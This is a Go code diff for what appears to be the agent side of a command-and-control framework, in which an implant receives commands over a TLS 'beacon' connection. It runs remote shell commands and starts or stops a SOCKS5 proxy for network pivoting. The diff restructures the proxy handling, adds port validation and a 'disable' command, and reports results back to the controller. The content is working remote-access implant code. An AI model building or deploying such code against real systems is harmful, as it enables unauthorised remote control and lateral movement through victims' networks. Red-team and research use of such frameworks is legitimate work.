@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strconv"
 	"sync"
 	"time"
 
@@ -25,6 +26,7 @@ var (
 	RootCert          string
 	LoggingEnabled    string
 	cache             string
+	activeProxy       *ProxyServer
 )
 
 type ProxyServer struct {
@@ -174,19 +176,18 @@ func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.D
 		}
 		if response.Type == types.CommandResponseType {
 			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
-				commandResult := types.CommandStatusRequest{}
-				if commandResponse.CommandType == "shell" {
-					commandResult = executeAndReportCommand(beacon, encoder, commandResponse)
-				} else if commandResponse.CommandType == "socks" {
-					_, err := startSocks5Proxy(beacon, encoder, commandResponse)
-					if err == nil {
+				logger.Logf(logger.Debug, "commandType: %v", commandResponse.CommandType)
+				if commandResponse.CommandType == "socks" {
+					err := handleSocksCommand(beacon, encoder, commandResponse, &activeProxy)
+					if err != nil {
+						logger.Logf(logger.Error, "Error handling SOCKS5 command: %v", err)
+						return err
+					}
+				} else {
+					commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
+					if commandResult.CommandResult == "2" {
 						goto Exit
 					}
-					logger.Logf(logger.Done, "Started SOCKS5 proxy")
-				}
-
-				if commandResult.CommandResult == "2" {
-					goto Exit
 				}
 			} else {
 				return fmt.Errorf("unexpected payload type for CommandResponse")
@@ -211,32 +212,112 @@ Exit:
 	return nil
 }
 
-func startSocks5Proxy(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse) (*ProxyServer, error) {
-	port := commandResponse.Command
-	conf := &socks5.Config{}
-	server, err := socks5.New(conf)
-	if err != nil {
-		return nil, fmt.Errorf("failed to create SOCKS5 server: %v", err)
-	}
-	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
-	if err != nil {
-		return nil, fmt.Errorf("failed to start listener on port %d: %v", port, err)
-	}
-	ctx, cancel := context.WithCancel(context.Background())
-	proxy := &ProxyServer{
-		server:   server,
-		listener: listener,
-		cancel:   cancel,
-	}
-	proxy.wg.Add(1)
-	go func() {
-		defer proxy.wg.Done()
-		logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
-		if err := server.Serve(listener); err != nil && ctx.Err() == nil {
-			logger.Logf(logger.Error, "error while running proxy server: %v", err)
+func handleSocksCommand(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse, activeProxy **ProxyServer) error {
+	if commandResponse.Command == "disable" {
+		// Disable the active SOCKS5 proxy if one exists
+		if *activeProxy != nil {
+			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
+			(*activeProxy).StopProxy()
+			*activeProxy = nil
+			logger.Logf(logger.Done, "SOCKS5 proxy disabled")
+		} else {
+			logger.Logf(logger.Info, "No active SOCKS5 proxy to disable")
 		}
-	}()
-	return proxy, nil
+		req := types.CommandStatusRequest{
+			AgentID:       commandResponse.AgentID,
+			CommandID:     commandResponse.CommandID,
+			CommandResult: "1",
+			CommandOutput: "Stopped SOCKS5 Proxy",
+		}
+		client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+	} else {
+		// Prevent starting a new proxy if one is already active
+		if *activeProxy != nil {
+			logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
+			req := types.CommandStatusRequest{
+				AgentID:       commandResponse.AgentID,
+				CommandID:     commandResponse.CommandID,
+				CommandResult: "1",
+				CommandOutput: "A SOCKS5 proxy is already running. Stop it before starting a new one.",
+			}
+			client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+			return nil
+		}
+
+		// Parse the port number
+		portStr := commandResponse.Command
+		port, err := strconv.Atoi(portStr)
+		if err != nil || port < 1 || port > 65535 {
+			logger.Logf(logger.Error, "Invalid port number: %s", portStr)
+			req := types.CommandStatusRequest{
+				AgentID:       commandResponse.AgentID,
+				CommandID:     commandResponse.CommandID,
+				CommandResult: "1",
+				CommandOutput: fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
+			}
+			client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+			return nil
+		}
+
+		logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
+		conf := &socks5.Config{}
+		server, err := socks5.New(conf)
+		if err != nil {
+			logger.Logf(logger.Warning, "failed to create SOCKS5 server: %v", err)
+			req := types.CommandStatusRequest{
+				AgentID:       commandResponse.AgentID,
+				CommandID:     commandResponse.CommandID,
+				CommandResult: "1",
+				CommandOutput: fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
+			}
+			client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+			return nil
+		}
+
+		// Start the listener
+		listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+		if err != nil {
+			logger.Logf(logger.Warning, "failed to start listener on port %d: %v", port, err)
+			req := types.CommandStatusRequest{
+				AgentID:       commandResponse.AgentID,
+				CommandID:     commandResponse.CommandID,
+				CommandResult: "1",
+				CommandOutput: fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
+			}
+			client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+			return nil
+		}
+
+		// Create the proxy server instance
+		ctx, cancel := context.WithCancel(context.Background())
+		proxy := &ProxyServer{
+			server:   server,
+			listener: listener,
+			cancel:   cancel,
+		}
+
+		// Start the proxy in a goroutine
+		proxy.wg.Add(1)
+		go func() {
+			defer proxy.wg.Done()
+			logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
+			if err := server.Serve(listener); err != nil && ctx.Err() == nil {
+				logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
+			}
+		}()
+
+		// Update the active proxy reference
+		*activeProxy = proxy
+		logger.Logf(logger.Done, "Started SOCKS5 proxy")
+		req := types.CommandStatusRequest{
+			AgentID:       commandResponse.AgentID,
+			CommandID:     commandResponse.CommandID,
+			CommandResult: "1",
+			CommandOutput: "Started SOCKS5 Proxy",
+		}
+		client_utils.SendRequest(encoder, types.CommandStatusRequestType, req)
+	}
+	return nil
 }
 
 func (p *ProxyServer) StopProxy() {
